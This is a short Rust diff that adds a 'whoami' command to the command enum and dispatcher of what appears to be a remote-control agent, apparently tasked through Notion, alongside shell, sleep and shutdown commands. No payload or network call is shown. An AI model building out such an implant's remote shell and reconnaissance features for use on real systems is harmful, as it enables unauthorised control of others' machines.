@@ -20,6 +20,7 @@ mod save;
 pub mod shell;
 mod sleep;
 mod shutdown;
+mod whoami;
 mod unknown;
 
 /// All the possible command types. Some have command strings, and some don't.
@@ -38,6 +39,7 @@ pub enum CommandType {
     Shell(String),
     Shutdown,
     Sleep(String),
+    Whoami,
     Unknown(String)
 }
 
@@ -88,7 +90,8 @@ impl NotionCommand {
                 "shell"    => CommandType::Shell(command_string),
                 "shutdown" => CommandType::Shutdown,
                 "sleep"    => CommandType::Sleep(command_string),
-                _          => CommandType::Unknown(command_string)
+                "whoami"   => CommandType::Whoami,
+                _          => CommandType::Unknown(command_string),
             };
             return Ok(NotionCommand { command_type: command_type});
 
@@ -113,6 +116,7 @@ impl NotionCommand {
             CommandType::Shell(s)    => shell::handle(&s).await,
             CommandType::Shutdown    => shutdown::handle().await,
             CommandType::Sleep(s)    => sleep::handle(&s, config_options).await,
+            CommandType::Whoami      => whoami::handle().await,
             CommandType::Unknown(_)  => unknown::handle().await
         }
     }
